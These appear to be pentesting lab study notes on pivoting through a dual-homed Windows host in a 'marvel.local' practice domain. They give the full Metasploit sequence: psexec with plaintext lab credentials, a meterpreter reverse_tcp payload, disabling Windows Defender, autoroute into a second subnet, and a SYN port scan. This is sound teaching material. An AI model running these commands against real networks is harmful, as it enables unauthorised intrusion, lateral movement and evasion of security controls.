### **Notes: Pivoting in Practice**

---

### **Objective:**

Leverage a compromised machine to pivot into an isolated network and perform post-exploitation activities.

---

### **Practical Steps for Pivoting:**

1. **Use Exploit with Metasploit**:
    - Load the appropriate Metasploit module:
        
        ```Shell
        use exploit/windows/smb/psexec
        ```
        
    - Set required options:
        
        ```Shell
        set RHOSTS 192.168.57.141  # IP of the dual-homed machine (e.g., Frank Castle)
        set SMBDomain marvel.local
        set SMBPass password1
        set SMBUser EFCastle
        ```
        
    - Set payload:
        
        ```Shell
        set PAYLOAD windows/x64/meterpreter/reverse_tcp
        set LHOST eth0  # Listener network interface
        ```
        
2. **Exploit and Gain Access**:
    - Execute the exploit:
        
        ```Shell
        run
        ```
        
    - If blocked by Windows Defender, disable it and rerun the exploit.
    - Verify that a shell is obtained on the dual-homed machine.

### **Post-Exploitation (Routing & Scanning):**

1. **Inspecting the Network**:
    - Check available routes:
        
        ```Shell
        route print
        ipconfig
        ```
        
    - Example outputs indicate the machine’s dual-homed nature:
        - Subnet A: `192.168.57.x`
        - Subnet B: `10.10.10.x`
    - Verify connectivity between subnets:
        - Use `ping` to check communication between machines.
2. **Configure Pivot Routing**:
    - Use Metasploit’s AutoRoute to create routing for the new network:
        
        ```Shell
        run autoroute -s 10.10.10.0/24
        ```
        
    - Verify routes:
        
        ```Shell
        run autoroute -p
        ```
        
3. **Port Scanning the Pivoted Network**:
    - Use a Metasploit port scanning module to identify open ports:
        
        ```Shell
        search portscan
        use auxiliary/scanner/portscan/syn
        set RHOSTS 10.10.10.129  # Target in Subnet B
        set PORTS 445  # Example: Check if SMB is open
        run
        ```
        
    - Verify access:
        - Ensure the scanner confirms ports as open, demonstrating successful pivoting.

### **Concept Takeaways**:

1. **Definition of Pivoting**:
    - Redirect traffic through a compromised machine to access an otherwise unreachable network.
2. **Tools for Pivoting**:
    - **Metasploit** (as demonstrated).
    - **ProxyChains** (recommended for research).
    - **SSH Pivoting** (use SSH with dynamic port forwarding).
3. **Relevance in Practice**:
    - While not a daily occurrence in penetration tests, pivoting is essential for advanced engagements.
    - Familiarity with the concept and tools like Metasploit, ProxyChains, and SSH is highly beneficial.
4. **Actionable Advice**:
    - Research proxychains for dynamic pivoting.
    - Explore alternatives to Metasploit, like native tools for manual pivoting.
